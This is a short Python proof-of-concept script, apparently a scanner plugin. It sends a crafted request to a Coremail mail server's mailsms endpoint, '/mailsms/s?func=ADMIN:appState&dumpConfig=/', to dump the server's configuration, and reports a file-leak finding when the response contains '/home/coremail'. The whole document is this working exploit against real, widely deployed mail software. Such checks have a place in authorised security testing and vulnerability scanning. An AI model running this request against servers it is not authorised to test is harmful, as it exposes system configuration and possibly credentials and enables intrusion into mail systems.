# -*- Coding: utf-8 -*-
# Author: Vulkey_Chen
# Email: gh0stkey@hi-ourlife.com
# Website: www.hi-ourlife.com
# About: mailsms config dump PoC
import HackRequests


def poc(arg, **kwargs):
    url = arg + "/mailsms/s?func=ADMIN:appState&dumpConfig=/"
    hack = HackRequests.hackRequests()
    hh = hack.http(url)
    if hh.status_code != 404 and '/home/coremail' in hh.text:
        return {
            "name": "Coremail mailsms接口配置存在读取漏洞",
            "content": "通过配置接口能够获取系统核心配置功能",
            "url": url,
            "log": hh.log,
            "tag": "file leak"
        }
